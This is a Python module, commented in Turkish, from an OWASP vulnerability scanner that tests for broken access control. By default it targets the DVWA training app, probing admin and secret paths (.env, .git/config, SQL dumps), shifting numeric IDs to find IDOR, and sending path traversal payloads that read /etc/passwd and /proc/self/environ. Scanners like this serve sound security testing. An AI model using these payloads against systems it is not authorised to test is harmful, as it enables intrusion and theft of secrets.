"""
modules/A01_BrokenAccessControl.py

OWASP A01:2021 – Broken Access Control

Test stratejisi (tamamen statik analiz):
  Force Browsing:
    - Yetkisiz idari yolları GET ile test eder; 200 dönenler bulgu olur.
    - 403 dönenler düşük güvenle raporlanır (kaynak varlığı kanıtı).
  IDOR (Insecure Direct Object Reference):
    - Sayısal parametreleri ±1 değiştirip yanıt farklılığına bakar.
    - DVWA /vulnerabilities/sqli/?id= parametresi varsayılan hedef.
  Path Traversal:
    - "page", "file", "include" gibi parametrelere traversal payload'u gönderir.
    - DVWA /vulnerabilities/fi/?page= varsayılan hedef.
"""

from __future__ import annotations

import re
from typing import Any, Dict, List, Optional
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup

from core.base_module import BaseModule, Finding, Confidence, Severity
from core.http_client import HTTPClient
from core.llm_client import LLMClient

# ---------------------------------------------------------------------------
# Force Browsing – hedef yollar
# ---------------------------------------------------------------------------

_ADMIN_PATHS: list[str] = [
    "/admin", "/admin/", "/admin.php",
    "/administrator", "/administrator/",
    "/phpmyadmin", "/phpmyadmin/",
    "/.git/HEAD", "/.git/config",
    "/.env", "/backup.zip", "/backup.sql", "/dump.sql",
    "/config.php", "/config.bak", "/web.config",
    "/dvwa/hackable/uploads/",
    "/wp-admin/", "/wp-login.php",
    "/manager/html",        # Tomcat Manager
    "/console",             # JBoss / WildFly
    "/actuator",            # Spring Boot
    "/api/v1/users",        # REST API kullanıcı listesi
]

# ---------------------------------------------------------------------------
# Path Traversal – payload'lar ve imzalar
# ---------------------------------------------------------------------------

_TRAVERSAL_PAYLOADS: list[str] = [
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\windows\\win.ini",
    "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
    "/etc/passwd",
    "/proc/self/environ",
]

_TRAVERSAL_SIGNATURES: list[re.Pattern] = [
    re.compile(r"root:.*:0:0:", re.IGNORECASE),
    re.compile(r"daemon:.*:/", re.IGNORECASE),
    re.compile(r"\[extensions\]", re.IGNORECASE),       # windows/win.ini
    re.compile(r"HTTP_HOST|DOCUMENT_ROOT", re.IGNORECASE),  # /proc/self/environ
]

# Dosya yolu parametreleri olabilecek isimler
_PATH_PARAM_NAMES: frozenset[str] = frozenset(
    ["page", "file", "path", "dir", "document", "include", "template", "view", "load"]
)


class A01BrokenAccessControlModule(BaseModule):
    """OWASP A01:2021 – Broken Access Control tarayıcı modülü."""

    OWASP_ID = "A01"
    TITLE    = "Broken Access Control"

    def __init__(
        self,
        target: str,
        http_client: HTTPClient,
        shared_data: Optional[Dict[str, Any]] = None,
        llm_client: Optional[LLMClient] = None,
        enable_llm: bool = True,
    ) -> None:
        super().__init__(target, http_client, shared_data)
        self.llm = llm_client
        self.enable_llm = enable_llm and (llm_client is not None)

    # ------------------------------------------------------------------
    # Ana orkestrasyon
    # ------------------------------------------------------------------

    def run(self) -> List[Finding]:
        self.logger.info("A01 Broken Access Control başlatılıyor → %s", self.target)
        self._test_force_browsing()
        self._test_idor()
        self._test_path_traversal()
        if self.enable_llm:
            self._enrich_with_llm()
        self.logger.info("A01 tamamlandı. %d bulgu.", len(self._findings))
        return self.get_findings()

    # ------------------------------------------------------------------
    # Force Browsing
    # ------------------------------------------------------------------

    def _test_force_browsing(self) -> None:
        """Yetkisiz erişime açık yolları doğrudan GET ile dener."""
        for path in _ADMIN_PATHS:
            url = urljoin(self.target + "/", path.lstrip("/"))
            resp = self._safe_get(url)
            if resp is None:
                continue

            final_url_lower = resp.url.lower()
            # Login sayfasına yönlendirilmeden 200 dönüyorsa → bulgu
            if resp.status_code == 200 and "login" not in final_url_lower:
                self._add_finding(Finding(
                    owasp_id=self.OWASP_ID,
                    title="Force Browsing – Yetkisiz Kaynak Erişilebilir",
                    url=url,
                    parameter="path",
                    payload=path,
                    method="GET",
                    response_snippet=self._truncate_snippet(resp.text),
                    confidence=Confidence.MEDIUM,
                    severity=Severity.HIGH,
                    raw_details={
                        "status_code": resp.status_code,
                        "final_url": resp.url,
                        "content_length": len(resp.content),
                    },
                ))

            elif resp.status_code == 403:
                # 403 = kaynak var, erişim kısıtlı; bilgilendirici seviye
                self._add_finding(Finding(
                    owasp_id=self.OWASP_ID,
                    title="Force Browsing – Kaynak Varlığı Doğrulandı (403)",
                    url=url,
                    parameter="path",
                    payload=path,
                    method="GET",
                    response_snippet="HTTP 403 Forbidden – kaynak mevcut fakat kısıtlı.",
                    confidence=Confidence.LOW,
                    severity=Severity.LOW,
                    raw_details={"status_code": 403},
                ))

    # ------------------------------------------------------------------
    # IDOR
    # ------------------------------------------------------------------

    def _test_idor(self) -> None:
        """Sayısal parametreleri manipüle ederek yetkisiz kayıt erişimini test eder."""
        targets = self._collect_numeric_params()
        for url, param, base_val in targets:
            try:
                base_int = int(base_val)
            except ValueError:
                continue

            baseline = self._safe_get(url, params={param: base_val})
            if not baseline or baseline.status_code != 200:
                continue

            for delta in (-1, 1, 2, 100):
                test_val = str(base_int + delta)
                resp = self._safe_get(url, params={param: test_val})
                if not resp or resp.status_code != 200:
                    continue

                size_diff = abs(len(resp.content) - len(baseline.content))
                # İçerik değişti ama sayfa tamamen farklı değil → şüpheli IDOR
                if 50 < size_diff < 8000:
                    self._add_finding(Finding(
                        owasp_id=self.OWASP_ID,
                        title="IDOR – Doğrudan Nesne Referansı Manipülasyonu",
                        url=url,
                        parameter=param,
                        payload=test_val,
                        method="GET",
                        response_snippet=self._truncate_snippet(resp.text),
                        confidence=Confidence.MEDIUM,
                        severity=Severity.HIGH,
                        raw_details={
                            "original_value": base_val,
                            "test_value": test_val,
                            "baseline_bytes": len(baseline.content),
                            "test_bytes": len(resp.content),
                            "size_diff": size_diff,
                        },
                    ))
                    break  # Parametre başına tek bulgu yeterli

    # ------------------------------------------------------------------
    # Path Traversal
    # ------------------------------------------------------------------

    def _test_path_traversal(self) -> None:
        """Dosya yolu parametrelerine traversal payload'u gönderir."""
        targets: list[tuple[str, str]] = []

        for entry in self.shared_data.get("get_params", []):
            for param in entry.get("params", []):
                if param.lower() in _PATH_PARAM_NAMES:
                    targets.append((entry["url"], param))

        # shared_data yoksa DVWA varsayılan LFI endpoint'i
        if not targets:
            targets.append((f"{self.target}/vulnerabilities/fi/", "page"))

        for url, param in targets:
            responses = self._test_payloads(url, param, _TRAVERSAL_PAYLOADS)
            for payload, resp in zip(_TRAVERSAL_PAYLOADS, responses):
                if resp is None:
                    continue
                for sig in _TRAVERSAL_SIGNATURES:
                    m = sig.search(resp.text)
                    if m:
                        snippet = self._extract_context(resp.text, m.start())
                        self._add_finding(Finding(
                            owasp_id=self.OWASP_ID,
                            title="Path Traversal – Yerel Dosya Okuma (LFI)",
                            url=url,
                            parameter=param,
                            payload=payload,
                            method="GET",
                            response_snippet=snippet,
                            confidence=Confidence.HIGH,
                            severity=Severity.CRITICAL,
                            raw_details={
                                "signature_matched": sig.pattern,
                                "status_code": resp.status_code,
                            },
                        ))
                        break  # İlk eşleşen imza yeterli

    # ------------------------------------------------------------------
    # Zorunlu arayüz
    # ------------------------------------------------------------------

    def _test_payloads(
        self,
        url: str,
        param: str,
        payloads: List[str],
        method: str = "GET",
        base_data: Optional[Dict[str, str]] = None,
    ) -> List[Optional[requests.Response]]:
        responses: List[Optional[requests.Response]] = []
        base = base_data.copy() if base_data else {}
        for payload in payloads:
            resp = None
            try:
                if method == "POST":
                    resp = self.http.post(url, data={**base, param: payload})
                else:
                    resp = self.http.get(url, params={**base, param: payload})
            except Exception as exc:
                self.logger.debug("Payload isteği başarısız [%s=%r]: %s", param, payload[:30], exc)
            finally:
                responses.append(resp)
        return responses

    def _enrich_with_llm(self) -> None:
        if not self._findings or self.llm is None:
            return
        self.logger.info("A01 LLM zenginleştirme (%d bulgu)...", len(self._findings))
        for finding in self._findings:
            try:
                finding.llm_analysis = self.llm.query(finding.to_dict())
            except Exception as exc:
                finding.llm_analysis = {"llm_hatasi": True, "hata_nedeni": str(exc)}

    # ------------------------------------------------------------------
    # Yardımcılar
    # ------------------------------------------------------------------

    def _collect_numeric_params(self) -> list[tuple[str, str, str]]:
        """shared_data'dan sayısal parametre adaylarını döndürür."""
        _NUMERIC_PARAM_NAMES = frozenset(
            ["id", "uid", "user_id", "account", "record", "item", "product", "order", "pid"]
        )
        results: list[tuple[str, str, str]] = []
        for entry in self.shared_data.get("get_params", []):
            for param in entry.get("params", []):
                if param.lower() in _NUMERIC_PARAM_NAMES:
                    results.append((entry["url"], param, "1"))
        if not results:
            results.append((f"{self.target}/vulnerabilities/sqli/", "id", "1"))
        return results

    def _extract_context(self, text: str, pos: int, window: int = 150) -> str:
        start = max(0, pos - window // 2)
        end   = min(len(text), pos + window // 2)
        snippet = text[start:end].strip()
        if start > 0:
            snippet = "…" + snippet
        if end < len(text):
            snippet += "…"
        return snippet
